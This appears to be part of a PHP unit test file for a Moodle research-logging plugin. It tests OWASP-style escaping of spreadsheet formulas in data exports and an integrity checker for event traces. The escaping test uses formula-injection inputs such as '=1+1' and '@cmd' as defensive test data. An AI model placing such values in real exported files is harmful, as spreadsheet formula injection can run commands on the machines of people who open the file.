    public function test_formula_escaping_matches_the_owasp_rules(): void {
        $this->assertSame("'=1+1", research_export::escape_formula('=1+1'));
        $this->assertSame("'  -2", research_export::escape_formula('  -2'));
        $this->assertSame("'+A1", research_export::escape_formula('+A1'));
        $this->assertSame("'@cmd", research_export::escape_formula('@cmd'));
        $this->assertSame('-', research_export::escape_formula('-'));
        $this->assertSame("'=x", research_export::escape_formula("'=x"));
        $this->assertSame('x=1', research_export::escape_formula('x=1'));
        $this->assertSame(-0.5, research_export::escape_formula(-0.5));
        $this->assertNull(research_export::escape_formula(null));
    }
    public function test_integrity_check_reports_gaps_clipping_missing_modality_and_active_time(): void {
        $this->resetAfterTest();
        $this->enable_study();

        $user = $this->getDataGenerator()->create_user();
        $this->make_participant($user);
        [$quiz, $usageid, $slot] = $this->create_quiz_attempt($user, input_mode::NORMAL);

        $trace = ['traceid' => '33333333-3333-4333-8333-333333333333'];
        $at = fn(int $seq, string $type, array $more = []) => $this->event($usageid, $slot, $trace + [
            'eventseq' => $seq, 'type' => $type, 'clienttime' => 1791190800000 + $seq * 60000,
        ] + $more);
        research_logger::record_batch([
            $at(1, 'interaction_started', ['input' => null, 'modality' => null, 'payload' => ['revisit' => false]]),
            $at(2, 'task_started', ['input' => null, 'modality' => null, 'payload' => []]),
            // 3 never arrived.
            $at(4, 'candidate_selected', ['modality' => null, 'payload' => ['kind' => 'line']]),
            $at(5, 'edit_committed', ['modality' => 'keyboard',
                'payload' => ['after' => 'x…[truncated]', 'truncated' => true]]),
            $at(6, 'activity_paused', ['input' => null, 'modality' => null,
                'payload' => ['reason' => 'hidden', 'activeMs' => 30000, 'totalActiveMs' => 30000]]),
            $at(7, 'task_finished', ['input' => null, 'modality' => null, 'payload' => ['activeTimeMs' => 50000]]),
            $at(8, 'interaction_started', ['input' => null, 'modality' => null, 'payload' => ['revisit' => true]]),
            $at(9, 'activity_paused', ['input' => null, 'modality' => null,
                'payload' => ['reason' => 'leave', 'activeMs' => 9000, 'totalActiveMs' => 50000]]),
            // The browser reports why 3 never arrived, twice (a resend).
            $at(0, 'delivery_failed', ['eventid' => '00000000-0000-4000-8000-999999999991', 'input' => null,
                'modality' => null, 'payload' => ['originalEventId' => '00000000-0000-4000-8000-999999999993',
                'originalEventSeq' => 3, 'originalType' => 'recognition_started', 'reason' => 'rejected',
                'attempts' => 1]]),
            $at(0, 'delivery_failed', ['eventid' => '00000000-0000-4000-8000-999999999992', 'input' => null,
                'modality' => null, 'payload' => ['originalEventId' => '00000000-0000-4000-8000-999999999993',
                'originalEventSeq' => 3, 'originalType' => 'recognition_started', 'reason' => 'rejected',
                'attempts' => 1]]),
            $at(10, 'edit_committed', ['payload' => ['burstId' => 'b1', 'trigger' => 'blur']]),
            $at(11, 'edit_committed', ['payload' => ['burstId' => 'b1', 'trigger' => 'recovered']]),
            // STACK filled the answer from the working: no input method, by design.
            $at(12, 'answer_inserted', ['modality' => null, 'payload' => ['via' => 'stack_js', 'value' => '4']]),
        ], (int)$user->id);

        $traces = \local_hand2stack\local\research_integrity::check('pilot2026a', (int)$quiz->cmid);
        $this->assertCount(1, $traces);
        $result = $traces[0];
        $this->assertSame([3], $result['missing']);
        $this->assertSame([['originalseq' => 3, 'originaltype' => 'recognition_started', 'reason' => 'rejected',
            'attempts' => 1]], $result['failed']);
        $this->assertSame(11, $result['events'], 'delivery_failed is not part of the trace');
        $this->assertSame(1, $result['duplicateedits']);
        $this->assertSame(0, $result['siblingtraces']);
        $this->assertCount(1, $result['truncated']);
        $this->assertCount(1, $result['nomodality'], 'only the selection; STACK\'s own insert is not a learner action');
        $this->assertSame(50000, $result['activems']);
        $this->assertSame(5 * 60000, $result['wallms']);
        $this->assertSame(1, $result['revisits']);
        $this->assertTrue(\local_hand2stack\local\research_integrity::has_issues($result));
        $this->assertArrayNotHasKey('usageid', $result);
    }
}
